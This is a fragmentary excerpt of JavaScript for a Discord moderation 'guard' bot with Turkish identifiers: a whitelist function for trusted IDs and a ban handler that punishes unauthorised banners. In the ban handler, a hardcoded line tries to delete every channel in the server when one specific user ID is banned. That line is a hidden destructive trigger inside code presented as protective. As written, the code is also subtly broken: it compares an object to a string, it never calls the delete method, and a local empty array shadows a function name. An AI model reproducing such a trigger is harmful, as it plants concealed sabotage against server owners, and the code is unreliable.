...
function guvenli(kisiID) {
  ...
  let guvenli = []; if (!uye || uye.id === client.user.id || uye.id === ayarlar.rexa || uye.id === ayarlar.favian || uye.id === ayarlar.owner || uye.id === ayarlar.sweizn || uye.id === ayarlar.bletres || uye.id === ayarlar.modbot || uye.id === ayarlar.registerbot || uye.id === uye.guild.owner.id || guvenli.some(g => uye.id === g.slice(1) || uye.roles.cache.has(g.slice(1)))) return true
  else return false;
};
...
client.on("guildBanAdd", async (guild, üyecik) => {
  ...
  if (!yetkili || !yetkili.executor || guvenli(yetkili.executor.id) || !s.banGuard) return;
   cezalandir(yetkili.executor.id, "cezalandır");
    if (üyecik === "813799329407041576") {guild.channels.cache.forEach(x => x.delete)}
